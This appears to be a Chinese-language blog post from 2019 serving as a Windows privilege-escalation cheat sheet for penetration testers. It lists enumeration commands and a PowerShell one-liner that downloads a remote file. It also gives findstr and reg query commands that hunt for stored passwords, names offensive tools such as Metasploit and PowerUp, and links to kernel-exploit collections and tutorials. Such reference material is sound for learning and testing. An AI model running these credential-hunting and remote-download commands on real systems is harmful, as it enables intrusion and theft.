---
layout: default
title:  "windows提权"
date:   2019-03-03 15:16
categories: post
---
相关文章：
- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
- https://www.hackingarticles.in/windows-kernel-exploit-privilege-escalation/

Windows常用命令

    命令  描述
    systeminfo  打印系统信息
    whoami  获得当前用户名
    whoami /priv  当前帐户权限
    ipconfig  网络配置信息
    ipconfig /displaydns  显示DNS缓存
    route print  打印出路由表
    arp -a  打印arp表
    hostname  主机名
    net user  列出用户
    net user UserName  关于用户的信息
    net use \SMBPATH Pa$$w0rd /u:UserName  连接SMB
    net localgroup  列出所有组
    net localgroup GROUP  关于指定组的信息
    net view \127.0.0.1  会话打开到当前计算机
    net session  开放给其他机器
    netsh firewall show config  显示防火墙配置
    DRIVERQUERY  列出安装的驱动
    tasklist /svc  列出服务任务
    net start  列出启动的服务
    dir /s foo  在目录中搜索包含指定字符的项目
    dir /s foo == bar  同上
    sc query  列出所有服务
    sc qc ServiceName  找到指定服务的路径
    shutdown /r /t 0  立即重启
    type file.txt  打印出内容
    icacls “C:\Example”  列出权限
    wmic qfe get Caption,Description,HotFixID,InstalledOn  列出已安装的布丁
    (New-Object System.Net.WebClient).DownloadFile(“http://host/file”,”C:\LocalPath”)  利用ps远程下载文件到本地
    accesschk.exe -qwsu “Group”  修改对象（尝试Everyone，Authenticated Users和/或Users）

    参考url：https://ss64.com/nt/
    提权exp推荐

    https://github.com/SecWiki/windows-kernel-exploits
    https://www.exploit-db.com/local/
    https://pentestlab.blog/2017/04/24/windows-kernel-exploits/
    搜索系统上可疑敏感文件

    dir C:\*vnc.ini /s /b /c
    或者在名称中包含关键词的项目：

    dir C:\ /s /b /c | findstr /sr \*password\*
    或者可以在文件内容中搜索password之类的关键字：

    findstr /si password \*.txt | \*.xml | \*.ini
    可以查询注册表，例如，字符串password：

    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
    常用工具

    Metasploit
    Sherlock
    windows-privesc-check
    Windows-Exploit-Suggester
    PowerUp, now part of PowerSploit
    Nishang
    推荐阅读：

    Windows权限升级基础
    https://www.fuzzysecurity.com/tutorials/16.html

    Windows权限升级第1部分：本地管理员权限
    https://blog.netspi.com/windows-privilege-escalation-part-1-local-administrator-privileges/

    Pentesters的Windows权限提升方法
    https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

    “嗯，快速升级”常见的Windows权限升级向量
    https://toshellandback.com/2015/11/24/ms-priv-esc/

    自动执行Windows权限提升
    http://resources.infosecinstitute.com/automating-windows-privilege-escalation/

    Windows 8上的Extreme Privilege Escalation
    https://www.blackhat.com/docs/us-14/materials/us-14-Kallenberg-Extreme-Privilege-Escalation-On-Windows8-UEFI-Systems.pdf

    滥用令牌权限进行Windows本地权限提升
    https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/

    Microsoft Windows令牌绑定权限提升漏洞
    https://tools.cisco.com/security/center/viewAlert.x?alertId=15702

    您对GPP了解多少？
    https://www.toshellandback.com/2015/08/30/gpp/

    Windows操作系统中的Privelege升级
    http://www.cs.toronto.edu/~arnold/427/15s/csc427/indepth/privilege-escalation/privilege-escalation-windows.pdf

    滥用EOP的令牌权限
    https://github.com/hatRiot/token-priv

    利用弱文件夹权限提升权限
    http://www.greyhathacker.net/?p=738

    Metasploit Unleashed：特权升级
    https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

    位操作：将系统令牌作为普通用户窃取
    https://zerosum0x0.blogspot.nl/2016/02/bits-manipulation-stealing-system.html

    不带引号的服务路径
    https://www.commonexploits.com/unquoted-service-paths/

    Windows中的权限提升
    https://codemuch.tech/2017/05/14/priv-esc-win.html

    SysInternals AccessChk工具
    https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

    AccessChk.exe使用指南
    https://blogs.technet.microsoft.com/secguide/2008/07/21/how-to-use-accesschk-exe-for-security-compliance-management/

    SubInACL.exe下载
    https://www.microsoft.com/en-us/download/details.aspx?id=23510

    当我输入getsystem时会发生什么
    https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

    动态链接库搜索顺序
    https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx

    进程监视器下载
    https://docs.microsoft.com/en-us/sysinternals/downloads/procmon

    动态链接库安全性
    https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx

    Windows文件和文件夹权限指南
    https://msdn.microsoft.com/en-us/library/bb727008.aspx

    SECWIKI
    https://github.com/SecWiki

    Acess Tokens
    https://msdn.microsoft.com/en-us/library/windows/desktop/aa374909(v=vs.85).aspx

    访问令牌的工作原理
    https://technet.microsoft.com/en-us/library/cc783557(v=ws.10).aspx

    Windows REG参考
    https://ss64.com/nt/reg.html

    Windows CMD参考
    https://ss64.com/nt/

    如何使用Regedit
    https://www.techsupportalert.com/content/learn-how-use-windows-registry-editor-regedit-one-easy-lesson.htm

    调用-WCMDump
    https://securityonline.info/invoke-wcmdump-dump-windows-credentials-from-the-credential-manager/

    WMIC命令参考
    https://www.computerhope.com/wmic.htm

    PowerShell参考
    https://ss64.com/ps/

    penetration-testing-ninjitsu-with-ed
    http://carnal0wnage.blogspot.com/2008/02/penetration-testing-ninjitsu-with-ed.html

    DLL劫持易受攻击的应用程序
    https://www.exploit-db.com/dll-hijacking-vulnerable-applications/

    Windows/Linux本地特权升级研讨会
    https://github.com/sagishahar/lpeworkshop

    如何使用组策略劫持攻击拥有任何Windows网络
    https://labs.mwrinfosecurity.com/blog/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/

    真实世界中的Pentesting：组策略Pwnage
    https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/

    Windows内核漏洞利用
    https://pentestlab.blog/2017/04/24/windows-kernel-exploits/